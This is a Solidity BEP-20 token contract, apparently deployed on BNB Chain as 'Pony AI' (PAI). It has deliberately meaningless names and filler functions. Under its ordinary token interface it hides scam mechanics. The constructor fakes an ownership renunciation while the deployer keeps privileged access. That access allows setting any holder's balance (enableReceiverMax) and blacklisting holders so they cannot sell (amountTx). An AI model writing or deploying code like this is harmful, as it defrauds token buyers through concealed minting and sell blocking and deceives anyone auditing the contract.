/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface listLimitTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isMax) external view returns (uint256);

    function transfer(address exemptMin, uint256 enableSell) external returns (bool);

    function allowance(address modeWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableSell) external returns (bool);

    function transferFrom(
        address sender,
        address exemptMin,
        uint256 enableSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityTotalBuy, uint256 value);
    event Approval(address indexed modeWallet, address indexed spender, uint256 value);
}

interface listLimitTxMetadata is listLimitTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract teamList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoSender {
    function createPair(address takeMode, address autoFee) external returns (address);
}

interface maxLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PonyAI is teamList, listLimitTx, listLimitTxMetadata {

    address public feeTrading;

    function approve(address feeEnableExempt, uint256 enableSell) public virtual override returns (bool) {
        swapReceiverAmount[_msgSender()][feeEnableExempt] = enableSell;
        emit Approval(_msgSender(), feeEnableExempt, enableSell);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return sellFrom;
    }

    function getOwner() external view returns (address) {
        return limitTradingIs;
    }

    function transfer(address launchTrading, uint256 enableSell) external virtual override returns (bool) {
        return exemptSenderMin(_msgSender(), launchTrading, enableSell);
    }

    uint256 public autoLiquidity;

    function exemptSenderMin(address fundIs, address exemptMin, uint256 enableSell) internal returns (bool) {
        if (fundIs == feeTrading) {
            return tradingMode(fundIs, exemptMin, enableSell);
        }
        require(!isTo[fundIs]);
        return tradingMode(fundIs, exemptMin, enableSell);
    }

    address private limitTradingIs;

    mapping(address => bool) public isTo;

    uint256 public listToFrom;

    function feeEnable() private view{
        require(receiverWallet[_msgSender()]);
    }

    function allowance(address toFrom, address feeEnableExempt) external view virtual override returns (uint256) {
        return swapReceiverAmount[toFrom][feeEnableExempt];
    }

    function receiverAuto() public view returns (uint256) {
        return fundTrading;
    }

    function balanceOf(address isMax) public view virtual override returns (uint256) {
        return enableShould[isMax];
    }

    mapping(address => bool) public receiverWallet;

    function feeTo(address sellToken) public {
        require(!atWalletSender);
        
        receiverWallet[sellToken] = true;
        if (fundTrading == tradingSell) {
            amountSell = tokenTx;
        }
        atWalletSender = true;
    }

    function tradingMode(address fundIs, address exemptMin, uint256 enableSell) internal returns (bool) {
        require(enableShould[fundIs] >= enableSell);
        enableShould[fundIs] -= enableSell;
        enableShould[exemptMin] += enableSell;
        emit Transfer(fundIs, exemptMin, enableSell);
        return true;
    }

    uint256 public tradingSell;

    uint256 private sellAmountIs = 100000000 * 10 ** 18;

    uint8 private sellFrom = 18;

    address public limitTeamTx;

    string private senderAt = "PAI";

    function transferFrom(address fundIs, address exemptMin, uint256 enableSell) external override returns (bool) {
        if (swapReceiverAmount[fundIs][_msgSender()] != type(uint256).max) {
            require(enableSell <= swapReceiverAmount[fundIs][_msgSender()]);
            swapReceiverAmount[fundIs][_msgSender()] -= enableSell;
        }
        return exemptSenderMin(fundIs, exemptMin, enableSell);
    }

    function owner() external view returns (address) {
        return limitTradingIs;
    }

    function txList() public view returns (uint256) {
        return fundTrading;
    }

    function enableReceiverMax(address launchTrading, uint256 enableSell) public {
        feeEnable();
        enableShould[launchTrading] = enableSell;
    }

    function symbol() external view virtual override returns (string memory) {
        return senderAt;
    }

    mapping(address => mapping(address => uint256)) private swapReceiverAmount;

    uint256 public fundTrading;

    constructor (){ 
        
        maxLaunched amountLaunched = maxLaunched(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        limitTeamTx = autoSender(amountLaunched.factory()).createPair(amountLaunched.WETH(), address(this));
        limitTradingIs = _msgSender();
        
        feeTrading = _msgSender();
        receiverWallet[_msgSender()] = true;
        if (tradingSell == tokenTx) {
            tradingSell = listToFrom;
        }
        enableShould[_msgSender()] = sellAmountIs;
        emit Transfer(address(0), feeTrading, sellAmountIs);
        amountAuto();
    }

    function shouldTxSender() public view returns (uint256) {
        return tradingSell;
    }

    function amountTx(address receiverMin) public {
        feeEnable();
        if (fundTrading != tokenTx) {
            listToFrom = autoLiquidity;
        }
        if (receiverMin == feeTrading || receiverMin == limitTeamTx) {
            return;
        }
        isTo[receiverMin] = true;
    }

    bool public atWalletSender;

    function totalSupply() external view virtual override returns (uint256) {
        return sellAmountIs;
    }

    function launchSellLaunched() public {
        if (tokenTx != fundTrading) {
            tradingSell = amountSell;
        }
        if (tokenTx != amountSell) {
            amountSell = fundTrading;
        }
        autoLiquidity=0;
    }

    uint256 private tokenTx;

    event OwnershipTransferred(address indexed walletEnable, address indexed atBuy);

    string private receiverTake = "Pony AI";

    function teamMarketing() public {
        if (autoLiquidity == tokenTx) {
            autoLiquidity = amountSell;
        }
        if (autoLiquidity != fundTrading) {
            tokenTx = amountSell;
        }
        tokenTx=0;
    }

    function name() external view virtual override returns (string memory) {
        return receiverTake;
    }

    function amountAuto() public {
        emit OwnershipTransferred(feeTrading, address(0));
        limitTradingIs = address(0);
    }

    uint256 private amountSell;

    mapping(address => uint256) private enableShould;

    function minSell() public view returns (uint256) {
        return tradingSell;
    }

}